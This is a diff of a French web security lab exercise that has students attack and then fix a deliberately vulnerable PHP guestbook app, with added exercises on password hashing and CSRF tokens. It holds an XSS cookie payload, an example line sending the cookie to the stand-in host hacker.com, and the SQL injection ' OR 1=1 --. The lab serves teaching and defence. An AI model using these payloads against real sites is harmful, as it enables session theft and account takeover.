@@ -85,7 +85,7 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
     C'est l'attaque la plus critique. Voler le cookie de session d'un admin (le fameux `PHPSESSID` généré automatiquement par PHP) permet d'usurper son identité.
 
     *   **Action :** Taper : `<script>alert(document.cookie)</script>`
-    *   **Résultat :** Vérifier l'affichage de `PHPSESSID=...`. C'est le sésame qui prouve au serveur que l'utilisateur est connecté.
+    *   **Question :** Quelle chaîne de caractères s'affiche ? Que représente-t-elle pour le serveur ?
     *   **Note :** Dans une vraie attaque, le script enverrait ce cookie vers un serveur pirate (ex: `window.location='http://hacker.com?cookie='+document.cookie`).
 
     ### 🕵️‍♂️ Analyse du Code (Livre d'or)
@@ -129,7 +129,15 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
         ```
     3.  Se connecter au Lab en tant qu'admin.
     4.  Ouvrir un nouvel onglet et glisser-déposer le fichier `piege.html` dedans.
-    5.  Retourner sur le Lab : le message est apparu ! L'action a été effectuée à l'insu de l'utilisateur.
+    5.  **Question :** Retourner sur le Lab. Que constatez-vous dans le livre d'or ? L'utilisateur connecté a-t-il explicitement écrit ce message ?
+
+    ## Partie 4 bis : Mots de passe et Hachage
+
+    ### 🎯 Défi 4.2 : Audit des mots de passe
+    
+    1.  Réutiliser la faille SQLi pour afficher le contenu de la colonne `password` de la table `users`.
+    2.  **Question 1 :** Quel constat faites-vous sur le format de stockage des mots de passe dans la base de données ?
+    3.  **Question 2 :** Justifiez pourquoi cette pratique représente un risque critique pour l'entreprise (notamment en conformité RGPD).
     </Enonce>
   </ExerciseSection>
 
@@ -145,28 +153,81 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     ### 🛠️ Correction 5.1 : Protection contre les XSS
     La règle d'or : **"Échapper les données à l'affichage"**.
-    Utiliser la fonction `htmlspecialchars()` qui transforme `<script>` en `&lt;script&gt;` (inoffensif).
+    Utiliser la fonction `htmlspecialchars()` qui transforme `<script>` en `&lt;script&gt;`.
+
+    3. Cette modification a un interêt. Préciser lequel.
 
     **Modifications à faire :**
-    1.  **Ligne 122 (Recherche) :**
+    4.  **Ligne 122 (Recherche) :**
         *   Avant : `echo "<p>Résultats pour : <b>" . $q . "</b></p>";`
         *   Après : `echo "<p>Résultats pour : <b>" . htmlspecialchars($q) . "</b></p>";`
-    2.  **Ligne 164 (Livre d'or) :**
+    5.  **Ligne 164 (Livre d'or) :**
         *   Avant : `echo "<div class='message-box'>" . $m['content'] . "</div>";`
         *   Après : `echo "<div class='message-box'>" . htmlspecialchars($m['content']) . "</div>";`
 
-    **Vérification :** Réessayer les attaques XSS sur `lab_fixed.php`. Le code Javascript doit s'afficher en texte mais ne plus s'exécuter.
+    **Question :** Réessayer les attaques XSS sur `lab_fixed.php`. Comment le navigateur interprète-t-il le script maintenant (voir code source Ctrl+U) ?
 
     ### 🛠️ Correction 5.2 : Protection contre les SQLi
     La règle d'or : **"Utiliser des requêtes préparées"**.
     Au lieu de coller les variables, utiliser des marqueurs (`:user`) et demander à la base de données de les traiter comme du texte pur, pas du code.
 
-    Il a été admis que remplir directement une requête sql n'est pas la bonne manière pour accéder à des informations à la suite d'une connexion.
+    5. Comment se prémunir de ces attaques? Expliquer comment fonctionne une requête préparée.
+    6. Modifier le formulaire pour que la récupération des notes ne se fasse plus par une requête SQL à remplir mais par une requête préparée.
 
-    1. Comment se prémunir de ces attaques? Expliquer comment fonctionne une requête préparée.
-    2. Modifier le formulaire pour que la récupération des notes ne se fasse plus par une requête SQL à remplir mais par une requête préparée.
+    **Question :** Réessayer l'injection `' OR 1=1 --`. Le contournement fonctionne-t-il toujours ? Pourquoi ?
 
-    **Vérification :** Réessayer l'injection `' OR 1=1 --`. Elle ne doit plus fonctionner (Identifiants incorrects).
+    ### 🛠️ Correction 5.3 : Hachage des mots de passe
+    La règle d'or : **"Ne jamais stocker de mot de passe en clair"**.
+
+    PHP offre des fonctions natives robustes : `password_hash()` (pour créer) et `password_verify()` (pour vérifier).
+
+    **Modifications à faire :**
+    7.  **Au début du fichier (Création des users) :**
+        Remplacer l'insertion en clair par :
+        ```php
+        $pass_admin = password_hash('SuperSecretPassword!123', PASSWORD_DEFAULT);
+        $db->exec("INSERT INTO users (username, password) VALUES ('admin', '$pass_admin')");
+        ```
+    8.  **Lors du Login :**
+        Ne plus chercher par mot de passe dans le SQL (`WHERE username = :u AND password = :p`).
+        *   Chercher seulement l'utilisateur : `SELECT * FROM users WHERE username = :u`
+        *   Vérifier le hash ensuite en PHP :
+            ```php
+            if ($row = $result->fetchArray()) {
+                if (password_verify($p, $row['password'])) {
+                    // Connexion OK
+                }
+            }
+            ```
+
+    ### 🛠️ Correction 5.4 : Protection CSRF (Token)
+    La règle d'or : **"Vérifier l'origine de la requête"**.
+
+    On ajoute un jeton aléatoire (token) dans la session et dans le formulaire. Si le formulaire envoyé ne contient pas le bon token, on rejette.
+
+    **Modifications à faire :**
+    9.  **Génération (après `session_start`) :**
+        ```php
+        if (empty($_SESSION['token'])) {
+            $_SESSION['token'] = bin2hex(random_bytes(32));
+        }
+        ```
+    10. **Dans le formulaire HTML (Livre d'or) :**
+        Ajouter un champ caché :
+        ```html
+        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
+        ```
+    11. **Vérification (Traitement du message) :**
+        ```php
+        if (isset($_POST['new_message'])) {
+            if (!hash_equals($_SESSION['token'], $_POST['token'])) {
+                die("Erreur CSRF !");
+            }
+            // ... suite du code d'insertion ...
+        }
+        ```
+
+    **Question :** Réessayer l'attaque avec `piege.html`. Quel message d'erreur obtenez-vous ? Expliquez pourquoi le piège ne fonctionne plus (indice : le fichier `piege.html` connait-il le token ?).
     </Enonce>
   </ExerciseSection>
 
